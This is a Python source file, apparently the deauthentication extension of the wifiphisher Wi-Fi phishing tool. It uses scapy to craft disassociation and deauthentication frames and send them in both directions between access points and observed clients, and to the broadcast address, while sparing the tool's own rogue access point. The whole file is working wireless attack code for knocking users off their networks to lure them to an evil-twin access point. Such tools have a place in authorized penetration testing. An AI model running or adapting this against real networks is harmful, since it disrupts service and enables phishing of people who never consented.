"""
Extension that sends 3 DEAUTH/DISAS Frames:
 1 from the AP to the client
 1 from the client to the AP
 1 to the broadcast address
"""

import scapy.layers.dot11 as dot11
import wifiphisher.common.constants as constants


class Deauth(object):
    """
    Handles all the deauthentication process.
    """

    def __init__(self, data):
        """
        Setup the class with all the given arguments.

        :param self: A Deauth object
        :param data: Shared data from main engine
        :type self: Deauth
        :type data: tuple
        :return: None
        :rtype: None
        """

        self._observed_clients = set()
        self._should_continue = True
        self._data = data
        self._first_run = True

    @staticmethod
    def _craft_packet(sender, receiver, bssid):
        """
        Return a list with disassociation packet followed by a
        deauthentication packet

        :param sender: The MAC address of the sender
        :param receiver: The MAC address of the receiver
        :param bssid: The MAC address of the AccessPoint
        :type sender: str
        :type receiver: str
        :type bssid: str
        :return: list
        :rtype: A list with disassociation followed by deauthentication packet
        """

        # craft disassociation packet
        disassoc_part = dot11.Dot11(type=0, subtype=10, addr1=receiver, addr2=sender, addr3=bssid)
        disassoc_packet = (dot11.RadioTap() / disassoc_part / dot11.Dot11Disas())

        # craft deauthentication packet
        deauth_part = dot11.Dot11(type=0, subtype=12, addr1=receiver, addr2=sender, addr3=bssid)
        deauth_packet = (dot11.RadioTap() / deauth_part / dot11.Dot11Deauth())

        return [disassoc_packet, deauth_packet]

    @staticmethod
    def _extract_bssid(packet):
        """
        Return the bssid of access point based on the packet type

        :param packet: A scapy.layers.RadioTap object
        :type packet: scapy.layers.RadioTap
        :return: bssid or None if it is WDS
        :rtype: str or None
        .. note: 0 0 -> IBBS
                 0 1 -> from AP
                 1 0 -> to AP
        """

        ds_value = packet.FCfield & 3
        to_ds = ds_value & 0x1 != 0
        from_ds = ds_value & 0x2 != 0

        # return the correct bssid based on the type
        return ((not to_ds and not from_ds and packet.addr3) or
                (not to_ds and from_ds and packet.addr1) or
                (to_ds and not from_ds and packet.addr2) or
                None)

    def get_packet(self, packet):
        """
        Process the Dot11 packets and add any desired clients to
        observed_clients.

        :param self: A Deauth object
        :param packet: A scapy.layers.RadioTap object
        :type self: Deauth
        :type packet: scapy.layers.RadioTap
        :return: A tuple with channel list followed by packets list
        :rtype: tuple
        """

        channels = list()
        packets_to_send = list()

        # basic malformed frame check
        try:
            # Discard WDS frame
            ds_value = packet.FCfield & 3
            if ds_value == 3:
                return ([], [])
            receiver = packet.addr1
            sender = packet.addr2
        except AttributeError:
            return ([], [])

        # when --essid is used we don't have target_ap_bssid
        if self._data.target_ap_bssid:
            # we need to create this packet only once
            if self._first_run:
                # Craft and add deauth/disas packet to broadcast address
                packets_to_send += self._craft_packet(self._data.target_ap_bssid,
                                                      constants.WIFI_BROADCAST,
                                                      self._data.target_ap_bssid)
                self._first_run = False

            bssid = self._data.target_ap_bssid
            channels.append(self._data.target_ap_channel)
        else:
            bssid = self._extract_bssid(packet)

            # Do not send deauth for our rogue access point
            if bssid == self._data.rogue_ap_mac:
                return ([], [])

            # obtain the channel for this packet
            try:
                # channel is in the third IE of Dot11Elt
                channel = ord(packet[dot11.Dot11Elt][2].info)

                # check if this is valid channel
                if channel not in constants.ALL_2G_CHANNELS:
                    return ([], [])

                channels.append(str(channel))
            except (TypeError, IndexError):
                # just return empty channel and packet
                return ([], [])

        clients = self._add_clients(sender, receiver, bssid)

        if clients:
            self._observed_clients.add(clients[0])
            packets_to_send += clients[1]

        return (channels, packets_to_send)

    def _add_clients(self, sender, receiver, bssid):
        """
        Return a tuple containing client followed by packets if the given
        packet is valid and return None otherwise

        :param self: A Deauth object
        :param sender: Address of the sender
        :param receiver: Address of the receiver
        :param bssid: Address of the bssid
        :type self: Deauth
        :type sender: str
        :type receiver: str
        :type bssid: str
        :return: (client: str, packets: list) or None
        :rtype: tuple or None
        """

        # addresses that are not acceptable
        non_valid_addresses = constants.NON_CLIENT_ADDRESSES.union(self._observed_clients)

        # craft the packets
        packets = lambda: (self._craft_packet(receiver, sender, bssid) +
                           self._craft_packet(sender, receiver, bssid))

        # return the client and packets if valid and None otherwise
        # it uses short circuiting to improve performance
        return (sender not in non_valid_addresses and
                receiver not in non_valid_addresses and
                (sender == bssid and (receiver, packets()) or
                 receiver == bssid and (sender, packets())) or
                None)

    def send_output(self):
        """
        Get any relevant output message

        :param self: A Deauth object
        :type self: Deauth
        :return: A list with all the message entries
        :rtype: list
        """

        return map("DEAUTH/DISAS - {}".format, self._observed_clients)

    def send_channels(self):
        """
        Send channes to subscribe

        :param self: A Deauth object
        :type self: Deauth
        :return: A list with all interested channels
        :rtype: list
        """

        # return target's channel if available otherwise all channels
        return (self._data.target_ap_channel if self._data.target_ap_bssid else
                map(str, constants.ALL_2G_CHANNELS))
